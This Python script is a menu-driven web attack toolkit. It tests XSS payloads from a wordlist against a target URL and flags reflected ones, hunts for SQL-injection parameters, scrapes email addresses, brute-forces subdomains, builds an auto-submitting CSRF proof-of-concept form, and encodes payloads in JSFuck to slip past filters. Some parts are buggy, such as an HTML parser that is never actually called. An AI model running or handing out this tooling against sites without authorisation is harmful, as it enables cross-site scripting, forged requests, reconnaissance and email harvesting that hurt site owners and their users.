import requests
import os
from termcolor import colored as cl
from bs4 import BeautifulSoup as bs
import re
import time

os.system('clear')


name_tool = """

██╗░░░░░██╗░░░██╗███████╗███████╗██╗░░░██╗  ████████╗░█████╗░░█████╗░██╗░░░░░
██║░░░░░██║░░░██║██╔════╝██╔════╝╚██╗░██╔╝  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
██║░░░░░██║░░░██║█████╗░░█████╗░░░╚████╔╝░  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
██║░░░░░██║░░░██║██╔══╝░░██╔══╝░░░░╚██╔╝░░  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
███████╗╚██████╔╝██║░░░░░██║░░░░░░░░██║░░░  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗
╚══════╝░╚═════╝░╚═╝░░░░░╚═╝░░░░░░░░╚═╝░░░  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝
   [+] CoDed By Mostafa Elguerdawi
   [+] instagram https://www.instagram.com/mostafa_elguerdawi
   [+] Have A Nice Day :)
"""

print(cl(name_tool, color='red'))

time.sleep(1)

options = """
1) XSS TOOL
2) SQL Parameter Finder
3) Emails Collector
4) SubDomains Collector
5) CSRF POC Generator
6) JS Fuck
"""
print(cl(options, color='yellow'))

try:
	opt = int(input(">>> "))
	print(" ")
except:
	print(cl("[-]Please input Valid Number.."))

###############################  1  #####################################

def xss(pay, url):
	try:
		url_2 = url.replace('PAYLOAD', pay)
		req = requests.get(url_2).text
		if pay in req:
			print(cl(f"[+]Payload Worked!!! ===> {pay}", color='green'))
			print(" ")

		else:
			print(cl(f"[-]Payload Not Worked ): ===> {pay}", color='red'))
			print(" ")

	except Exception as e:
		print(cl(e, color='red'))
		print(" ")


###############################  2  #####################################


def sql_founder(url, param):
	try:
		req = requests.get(url).text
		soup = (bs, 'html.parser')
		for i in soup.findAll('a'):
			hr = i.get('href')
			if param in hr:
				if url not in hr:
					founder = url + hr
				else:
					founder = hr
				fon = open('sql_params.txt', 'w')
				fon.write(founder+'\n')

				print(cl(founder, color='green'))
				print(" ")
	except Exception as e:
		print(e)

###############################  3  #####################################


def emails(url):
	try:
		req = requests.get(url).text
		Email_c = r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.com"

		find = re.findall(Email_c, req)
		if len(find) == 0:
			print(cl("No Emails Found...", color='red'))

		else:
			for email in find:
				print(" ")
				print(cl(email, color='green'))
	except Exception as e:
		print(e)

###############################  4  #####################################


def subdoamins(url,domain):
	try:
		subs = []
		url_2 = url.replace('SUB', domain)
		#https://SUB.example.com
		req = requests.get(url_2).status_code
		print(cl("Scanning....\nIt May Take a While..", color='yellow'))
		if req != 200:
			pass

		else:
			subs.append(url_2)
			print(cl(f"Found {len(subs)} Subdoamins", color='green'))
			print(" ")
			for i in subs:
				print(i)
	except Exception as e:
		print(e)


###############################  5  #####################################

def csrf_macker(action, params):
	csrf = """    <html>
	     <!-- CSRF Poc By LUFFY -->
	     <script>history.pushState('', '', '/')</script>
       <body>
          <form action=ACTION method=METHOD>
	"""
	param = params.split("&")
	act = action.split('&')
	
	cs = csrf.replace("ACTION",act[0]).replace("METHOD", act[1].upper())
	
	inp = "<input type='hidden' name='NAME' value='VALUE'/>"
	
	tail = """
	          </form>
	          </body>
	   <script>
	      document.forms[0].submit()
	   </script>
    </html>
	"""
	
	for par in param:
	   	sp_par = par.split('=')
	   	name = sp_par[0]
	   	value = sp_par[1]
	   	theInp = inp.replace("NAME", name).replace("VALUE", value)
	   	
	   	end = '\t'+theInp +'\n'
	   	cs += end
	print(cl(cs+tail, color='green'))

###############################  5  #####################################

def payload(dicte):
    try:
        xss = input(cl("Enter Your Payload >> ", color='blue')).lower()
        print(" ")
        while xss != 'exit':
            for i in range(len(xss)):
                x = dicte[xss[i]] + "+"
                js = str(x).split("\n")
                fin = str(js[0])
                fincl = cl(fin, color='red')
                print(fincl, end="")
            print("\n")
            xss = input(cl("Enter Your Payload >> ", color='blue')).lower()
            print(" ")
    except Exception as e:
        print(e)

###############################################################################################################################


if opt == 1:
	os.system('clear')
	mark = """
▀▄░▄▀ ░█▀▀▀█ ░█▀▀▀█ 　 ▀▀█▀▀ ░█▀▀▀█ ░█▀▀▀█ ░█─── 
─░█── ─▀▀▀▄▄ ─▀▀▀▄▄ 　 ─░█── ░█──░█ ░█──░█ ░█─── 
▄▀░▀▄ ░█▄▄▄█ ░█▄▄▄█ 　 ─░█── ░█▄▄▄█ ░█▄▄▄█ ░█▄▄█

	"""
	print(cl(mark, color='green'))
	xss_payloads = open('xss_payloads.txt', 'r').read().split('\n')
	url = input(cl("Enter URL With PAYLOAD(http://example.com/s=PAYLOAD)>> ", color='blue'))
	for pay in xss_payloads:
		xss(pay, url)

###############################################################################################################################

elif opt == 2:
	os.system('clear')
	mark = """
░█▀▀▀█ ░█▀▀█ ░█─── 　 ▀▀█▀▀ ░█▀▀▀█ ░█▀▀▀█ ░█─── 
─▀▀▀▄▄ ░█─░█ ░█─── 　 ─░█── ░█──░█ ░█──░█ ░█─── 
░█▄▄▄█ ─▀▀█▄ ░█▄▄█ 　 ─░█── ░█▄▄▄█ ░█▄▄▄█ ░█▄▄█

	"""
	print(cl(mark, color='green'))
	sql_par = ['id', 'uid', 'uuid', 'cat', 'category', 'username', 'name', 'password', 'pass', 'catID', 'ID', 'member', 'number', 'Number', 'Member']
	url = input(cl("Enter URL >> ", color='blue'))
	for param in sql_par:
		sql_founder(url, param)

###############################################################################################################################


elif opt == 3:
	os.system('clear')
	mark = """
░█▀▀▀ ░█▀▄▀█ ─█▀▀█ ▀█▀ ░█─── ░█▀▀▀█ 　 ░█▀▀█ ░█▀▀▀█ ░█─── ░█─── 
░█▀▀▀ ░█░█░█ ░█▄▄█ ░█─ ░█─── ─▀▀▀▄▄ 　 ░█─── ░█──░█ ░█─── ░█─── 
░█▄▄▄ ░█──░█ ░█─░█ ▄█▄ ░█▄▄█ ░█▄▄▄█ 　 ░█▄▄█ ░█▄▄▄█ ░█▄▄█ ░█▄▄█

	"""
	print(cl(mark, color='green'))
	url = input(cl("Enter Full Url >> ", color='blue'))
	emails(url)

###############################################################################################################################


elif opt == 4:
	os.system('clear')
	mark = """
░█▀▀▀█ ░█─░█ ░█▀▀█ ░█▀▀▄ ░█▀▀▀█ ░█▀▄▀█ ─█▀▀█ ▀█▀ ░█▄─░█ ░█▀▀▀█ 
─▀▀▀▄▄ ░█─░█ ░█▀▀▄ ░█─░█ ░█──░█ ░█░█░█ ░█▄▄█ ░█─ ░█░█░█ ─▀▀▀▄▄ 
░█▄▄▄█ ─▀▄▄▀ ░█▄▄█ ░█▄▄▀ ░█▄▄▄█ ░█──░█ ░█─░█ ▄█▄ ░█──▀█ ░█▄▄▄█

	"""
	print(cl(mark, color='green'))
	url = input(cl("Enter URL (https://SUB.example.com) >> ", color='blue'))
	domains = open('all_domains.txt', 'r').read().split('\n')
	for domain in domains:
		subdoamins(url, domain)

###############################################################################################################################


elif opt == 5:
	os.system('clear')
	mark = """
░█▀▀█ ░█▀▀▀█ ░█▀▀█ ░█▀▀▀ 　 ░█▀▄▀█ ─█▀▀█ ░█─▄▀ ░█▀▀▀ ░█▀▀█ 
░█─── ─▀▀▀▄▄ ░█▄▄▀ ░█▀▀▀ 　 ░█░█░█ ░█▄▄█ ░█▀▄─ ░█▀▀▀ ░█▄▄▀ 
░█▄▄█ ░█▄▄▄█ ░█─░█ ░█─── 　 ░█──░█ ░█─░█ ░█─░█ ░█▄▄▄ ░█─░█

	"""
	print(cl(mark, color='green'))
	try:
		action = input(cl("Enter Url With Action&Method(http://action&POST) >> ", color='blue'))
		print(" ")
		params = input(cl("Enter Parameters >> ", color='blue'))

		csrf_macker(action,params)

	except:
		print(cl(f"[-]Some Wrong Happend..", color='red'))


###############################################################################################################################

elif opt == 6:
	os.system('clear')
	mark = """
░░░▒█ ▒█▀▀▀█ 　 ▒█▀▀▀ ▒█░▒█ ▒█▀▀█ ▒█░▄▀ 
░▄░▒█ ░▀▀▀▄▄ 　 ▒█▀▀▀ ▒█░▒█ ▒█░░░ ▒█▀▄░ 
▒█▄▄█ ▒█▄▄▄█ 　 ▒█░░░ ░▀▄▄▀ ▒█▄▄█ ▒█░▒█
	"""
	print(cl(mark, color='green'))
	
	dicte = {
	'false':      '![]',
	'true':       '!![]',
	'undefined':  '[][[]]',
	'NaN':        '+{}',
	'Infinity':   '+[+!+[]+[!+[]+[]][+[]][!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]]][+[]]',
	'Array':    '[]',
	'Number':   '[+[]][0]',
	'String':   '[[]+[]][0]',
	'Boolean':  '[![]][0]',
	'Function': '[]["fill"]',
	'<':'([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]]',
	'>':'([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[!+[]+!+[]]',
	'RegExp':   'Function`$$${"return/"+false+"/"}$$```',
	'a':   '(![]+[])[+!+[]]',
	'b':   '[[][+[]]+{}][0][11]',
	'c':   '([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]',
	'd':   '([][[]]+[])[!+[]+!+[]]',
	'e':   '(!![]+[])[!+[]+!+[]+!+[]]',
	'f':   '(![]+[])[+[]]',
	'g':   '[false+[0]+String][0][20]',
	'h':   'Function`$${"return"+`[`+1+0+1+`][0]`+".toString("+2+1+")"}$```[1]',
	'i':   '([![]]+[][[]])[+!+[]+[+[]]]',
	'j':   '[[]+{}][0][10]',
	'k':   'Function`$${"return"+`[`+2+0+`][0]`+".toString("+2+1+")"}$```',
	'l':   '(![]+[])[!+[]+!+[]]',
	'm':   '[Number+0][0][11]',
	'n':   '([][[]]+[])[+!+[]]',
	'o':   '[[]+{}][0][1]',
	'p':   'Function`$${"return"+`[`+2+1+1+`][0]`+".toString("+3+1+")"}$```[1]',
	'q':   'Function`$${"return"+`[`+2+1+2+`][0]`+".toString("+3+1+")"}$```[1]',
	'r':   '(!![]+[])[+!+[]]',
	's':   '(![]+[])[!+[]+!+[]+!+[]]',
	't':   '(!![]+[])[+[]]',
	'u':   '([][[]]+[])[+[]]',
	'v':   'Function`$${"return"+`[`+3+1+`][0]`+".toString("+3+2+")"}$```',
	'w':   'Function`$${"return"+`[`+3+2+`][0]`+".toString("+3+3+")"}$```',
	'x':   'Function`$${"return"+`[`+1+0+1+`][0]`+".toString("+3+4+")"}$```[1]',
	'y':   '(+[![]]+[+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]])])[+!+[]+[+[]]]',
	'z':   'Function`$${"return"+`[`+3+5+`][0]`+".toString("+3+6+")"}$```',
	' ':   '[!![]+{}][0][11]',
	'!':   '`!`',
	'"':   'Function`$${"return"+`[[]+[]][+[]]`+".fontcolor()"}$```[12]',
	'(':   '([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]',
	')':   '([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]',
	}

	payload(dicte)
